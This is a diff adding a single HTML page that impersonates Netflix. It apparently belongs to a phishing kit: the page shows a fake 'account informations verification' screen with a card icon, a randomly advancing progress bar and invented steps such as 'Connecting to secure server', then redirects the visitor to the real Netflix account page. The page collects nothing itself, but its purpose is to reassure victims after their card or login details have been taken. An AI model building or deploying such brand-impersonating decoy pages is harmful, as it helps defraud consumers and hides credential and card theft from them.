@@ -1,0 +1,106 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Netflix</title>
+  <link rel="shortcut icon" href="style/favicon.ico">
+  <meta http-equiv="refresh" content="12; url=https://netflix.com/account">
+
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    background: #000; color: #fff;
+    font-family: 'Helvetica Neue', Arial, sans-serif;
+    min-height: 100vh; display: flex; flex-direction: column;
+    align-items: center; justify-content: center; text-align: center;
+  }
+  .logo {
+    font-size: 48px; color: #e50914; letter-spacing: 4px;
+    font-weight: 900; margin-bottom: 40px;
+    animation: pulse 2s ease-in-out infinite;
+  }
+  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.85} }
+  .spinner {
+    width: 70px; height: 70px;
+    border: 5px solid rgba(229,9,20,.2);
+    border-top-color: #e50914; border-radius: 50%;
+    animation: spin 1s linear infinite; margin-bottom: 30px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  h2 { font-size: 20px; font-weight: 400; margin-bottom: 10px; }
+  .sub { color: #999; font-size: 14px; margin-bottom: 40px; }
+  .progress {
+    width: 300px; height: 4px; background: #333;
+    border-radius: 2px; overflow: hidden; margin-bottom: 30px;
+  }
+  .progress-bar {
+    height: 100%; width: 0%;
+    background: linear-gradient(90deg, #e50914, #ff2c37);
+    transition: width .3s ease;
+  }
+  .steps { list-style: none; text-align: left; font-size: 14px; color: #666; min-width: 300px; }
+  .steps li { padding: 8px 0; display: flex; align-items: center; gap: 10px; }
+  .steps li.active { color: #fff; }
+  .steps li.done { color: #4caf50; }
+  .dot { width: 14px; height: 14px; border-radius: 50%; background: #333; flex-shrink: 0; }
+  .steps li.active .dot { background: #e50914; }
+  .steps li.done .dot { background: #4caf50; }
+  .card-icon {
+    width: 60px; height: 40px; border: 2px solid #e50914;
+    border-radius: 6px; position: relative; margin-bottom: 20px;
+    background: linear-gradient(135deg, #1a1a1a, #2a2a2a);
+  }
+  .card-icon:before {
+    content:''; position:absolute; top:8px; left:6px;
+    width:12px; height:8px; background:#e50914; border-radius:2px;
+  }
+</style>
+</head>
+<body>
+
+  <div class="logo">NETFLIX</div>
+  <div class="card-icon"></div>
+  <h2>Account informations verification…</h2>
+  <p class="sub">Please don't close this window</p>
+  <div class="spinner"></div>
+  <div class="progress"><div class="progress-bar" id="bar"></div></div>
+
+  <ul class="steps">
+    <li id="s1" class="active"><span class="dot"></span> Connecting to secure server…</li>
+    <li id="s2"><span class="dot"></span> Details verification in database…</li>
+    <li id="s3"><span class="dot"></span> Authorizing informations…</li>
+    <li id="s4"><span class="dot"></span> Success ! Redirecting…</li>
+  </ul>
+
+<script>
+  var bar = document.getElementById('bar');
+  var stepIds = ['s1','s2','s3','s4'];
+  var steps = [];
+  for (var i = 0; i < stepIds.length; i++) steps.push(document.getElementById(stepIds[i]));
+  var progress = 0, stepIndex = 0;
+
+  function advance() {
+    progress += Math.random() * 15 + 5;
+    if (progress > 100) progress = 100;
+    bar.style.width = progress + '%';
+
+    var threshold = (stepIndex + 1) * 25;
+    if (progress >= threshold && stepIndex < steps.length) {
+      if (stepIndex > 0) steps[stepIndex - 1].className = 'done';
+      steps[stepIndex].className = 'active';
+      stepIndex++;
+    }
+
+    if (progress < 100) {
+      setTimeout(advance, 400 + Math.random() * 600);
+    } else {
+      for (var j = 0; j < steps.length; j++) steps[j].className = 'done';
+    }
+  }
+  setTimeout(advance, 500);
+</script>
+
+</body>
+</html>
